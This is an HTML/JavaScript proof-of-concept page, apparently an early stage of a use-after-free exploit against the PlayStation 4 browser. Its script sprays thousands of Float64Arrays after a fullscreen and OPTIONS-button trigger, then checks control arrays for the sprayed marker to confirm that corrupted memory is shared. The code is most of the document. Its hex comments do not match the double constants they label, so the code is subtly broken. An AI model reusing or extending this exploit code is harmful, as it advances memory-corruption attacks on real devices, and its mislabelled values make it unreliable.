<!DOCTYPE html>
<html>
<body>
    <h1>PS4 UAF - Debugger Core [v2.1 Stable - TEST 1 FIX]</h1>
    <button onclick="run()">EXECUTAR PASSO 1</button>
    <div id="c"></div>

    <script>
        // Padrões de bits validados
        const P_A = 2.121995791e-314; // 0x4141414141414141
        const M_V = 3.395193267e-313; // 0xDEADBEEFCAFEBABE

        function f2h(f) {
            let b = new ArrayBuffer(8);
            (new Float64Array(b))[0] = f;
            let u = new Uint32Array(b);
            return "0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
        }

        function log(tag, status, msg) {
            const color = status === "PASS" ? "green" : (status === "FAIL" ? "red" : "black");
            document.getElementById('c').innerHTML += `<b style="color:${color}">[${tag}] ${status}</b> - ${msg}<br>`;
        }

        function run() {
            log("INIT", "INFO", "Criando 5000 Float64Arrays...");
            let ctrls = [];
            for(let i = 0; i < 5000; i++) {
                let a = new Float64Array(8); a[0] = i; ctrls.push(a);
            }

            log("WAIT", "INFO", "Entre em Fullscreen e aperte OPTIONS.");
            document.documentElement.webkitRequestFullscreen();

            window.onblur = function() {
                log("TRIG", "INFO", "Spray de memória iniciado...");
                let spray = [];
                for(let i = 0; i < 8000; i++) {
                    let s = new Float64Array(8); s.fill(P_A); spray.push(s);
                }

                let corr = null;
                for(let i = 0; i < ctrls.length; i++) {
                    if (ctrls[i][0] === P_A) {
                        corr = ctrls[i];
                        log("UAF", "PASS", `Detectado no Index: ${i}`);
                        break;
                    }
                }

                if (corr) {
                    // --- CORREÇÃO TESTE 1: IDENTIDADE REAL ---
                    // Escrevemos M_V no corrupted e buscamos no spray
                    corr[4] = M_V; 
                    let foundIdx = -1;
                    
                    for(let i = 0; i < spray.length; i++) {
                        if (spray[i][4] === M_V) {
                            foundIdx = i;
                            break;
                        }
                    }

                    if (foundIdx !== -1) {
                        log("TEST1", "PASS", `Identidade Confirmada: corr[4] == spray[${foundIdx}][4] (${f2h(M_V)})`);
                    } else {
                        log("TEST1", "FAIL", "Valores não conferem na memória compartilhada.");
                    }

                } else {
                    log("UAF", "FAIL", "Gatilho falhou. Tente timing de 2-3 segundos.");
                }
            };
        }
    </script>
</body>
</html>
